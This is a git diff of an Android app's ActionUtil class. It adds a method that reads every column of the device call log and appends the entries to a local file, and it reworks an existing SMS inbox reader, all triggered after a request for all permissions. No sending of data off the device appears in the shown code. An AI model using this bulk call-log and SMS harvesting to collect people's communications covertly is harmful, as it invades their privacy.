@@ -3,7 +3,8 @@ package com.vikasyadavnsit.cdc.utils;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.database.Cursor;
-import android.net.Uri;
+import android.provider.CallLog;
+import android.provider.Telephony;
 import android.widget.Button;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -42,10 +43,36 @@ public class ActionUtil {
                 CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
                 new PermissionManager().requestAllPermissions(activity);
                 //permissionHandler.resetAllPermissionManually(this);
-                Object messages = readSmsMessages(activity);
-                FileUtil.createFile(activity.getApplicationContext(), FileMap.SMS, messages);
+//                Object messages = readSmsMessages(activity);
+//                FileUtil.appendDataToFile(activity.getApplicationContext(), FileMap.SMS, messages);
+                Object messages = getCallLogs(activity.getApplicationContext());
+                FileUtil.appendDataToFile(activity.getApplicationContext(), FileMap.CALL, messages);
             });
         }
+    }
+
+
+    @SuppressLint("Range")
+    private static List<Map<String, String>> getCallLogs(Context context) {
+        // Query call log
+        List<Map<String, String>> messages = new ArrayList<>();
+        try {
+            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null,
+                    null, CallLog.Calls.DATE + " DESC");
+
+            if (cursor != null && cursor.moveToFirst()) {
+                do {
+                    Map<String, String> message = new TreeMap<>();
+                    Stream.of(cursor.getColumnNames()).forEach(columnName ->
+                            message.put(columnName, cursor.getString(cursor.getColumnIndex(columnName))));
+                    messages.add(message);
+                } while (cursor.moveToNext());
+                cursor.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return messages;
     }
 
 
@@ -54,8 +81,8 @@ public class ActionUtil {
         List<Map<String, String>> messages = new ArrayList<>();
 
         try {
-            Uri uri = Uri.parse("content://sms/inbox");
-            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
+            Cursor cursor = context.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null,
+                    null, Telephony.Sms.DATE + " DESC");
 
             if (cursor != null && cursor.moveToFirst()) {
                 do {
